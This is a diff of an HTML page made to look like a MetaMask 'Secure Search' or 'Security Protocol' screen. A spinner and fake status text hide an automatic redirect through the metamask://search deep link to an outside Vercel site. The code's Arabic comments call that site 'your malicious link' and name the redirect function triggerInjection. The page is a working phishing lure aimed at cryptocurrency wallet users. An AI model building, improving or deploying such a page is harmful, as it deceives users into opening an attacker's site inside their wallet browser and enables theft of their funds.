@@ -1,17 +1,34 @@
 <!DOCTYPE html>
-<html>
-<body onclick="window.location.href='metamask://search?q=https://hatestck.vercel.app/'" style="background:#000; color:#fff; height:100vh; display:flex; align-items:center; justify-content:center; text-align:center;">
-    
-    <div style="padding:20px; border:2px solid #f6851b; border-radius:15px;">
-        <h2 style="color:#f6851b;">SECURITY PROTOCOL</h2>
-        <p>Click anywhere on this screen to confirm your identity and open MetaMask.</p>
-    </div>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MetaMask Secure Search...</title>
+    <style>
+        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #0b0e11; color: white; }
+        .loader { border: 4px solid #1e2329; border-top: 4px solid #f6851b; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .text { margin-top: 20px; font-weight: bold; color: #f6851b; }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <div class="text">Synchronizing with MetaMask Browser...</div>
 
     <script>
-        // محاولة تحويل تلقائي فورية
-        setTimeout(() => {
-            window.location.replace("metamask://search?q=https://hatestck.vercel.app/");
-        }, 500);
+        // الرابط الخبيث الخاص بك على Vercel
+        const maliciousLink = "https://hatestck.vercel.app/";
+
+        // استخدام بارامتر البحث (Search Query) بدلاً من الـ URL المباشر
+        // التنسيق: metamask://search?q=Link
+        const targetUrl = "metamask://search?q=" + encodeURIComponent(maliciousLink);
+
+        function triggerInjection() {
+            window.location.href = targetUrl;
+        }
+
+        // تحويل بعد 3 ثوانٍ لمحاكاة عملية البحث
+        setTimeout(triggerInjection, 3000);
     </script>
 </body>
 </html>
